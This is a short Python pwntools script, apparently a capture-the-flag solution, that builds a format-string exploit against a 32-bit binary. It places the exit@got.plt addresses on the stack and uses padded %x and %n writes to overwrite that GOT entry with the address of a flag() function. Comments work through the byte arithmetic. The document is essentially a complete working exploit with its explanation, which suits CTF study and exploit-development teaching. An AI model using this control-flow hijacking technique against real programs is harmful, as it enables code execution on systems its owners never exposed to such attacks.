from pwn import *

flag_1 = 0x804a034
flag_2 = 0x804a035
flag_3 = 0x804a036
flag_4 = 0x804a037


# We are choosing to land on a JMP_SLOT because of R-X:
# --------------------------------------------
# 0x804a034 <exit@got.plt>:       0x0000008d -> r-x permissions
# 0x804a034  00000e07 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0


# We are NOT landing on our userInput because of -RW:
# -----------------------------------------------------
# "BBBB" = rw- permissions
# [+] In '[stack]'(0xfffdd000-0xffffe000), permission=rw-
# [+] In '[heap]'(0x804b000-0x806d000), permission=rw-


# NEED TO: explain how to land on "0x8d"
# --------------------------------------
# Write flag() address into exit@plt.got. When EIP hits exit JMP_SLOT
# it his our code offset.

# flag() -> exit@plt.got
payload = ""
payload += p32(flag_1)
payload += p32(flag_2)
payload += p32(flag_3)
payload += p32(flag_4)

# "%9x" + "%n" = land  & execute on 10th byte. ("AAAA" in user padding)
# flag 0804870b

# ******AA
# 0x5d > 0x0b. We need to go 1 byte more -> *0ba = 0x10b
# Reason we went to 0x10b and not 0x70b is that we are focusing on LSB byte - 0x******AA != 0x*****AAA
# (0x10b - 0x5d) + 8 - 1?
payload += "%181x"
payload += "%10$n" # 0x10b

# ***BBB** 892
#  0x10b to 0x1130b - low nibble of 2nd LSB is overwritten from "1" to "3"
# 0x113 < 0x487
# (0x487 - 0x113) + 8
payload += "%892x"
payload += "%11$n" # 0x4870b

# CCC***** 893
# 0x4870b to 0x48f870b - Low Nibble of 3rd LSB is overwritten from "4" to "f"
# 0x48f < 0x804
# (0x804 - 0x48f) + 8
payload += "%893x"
payload += "%12$n" # 0x804a034 <exit@got.plt>:       0x0804870b <- flag()

print payload

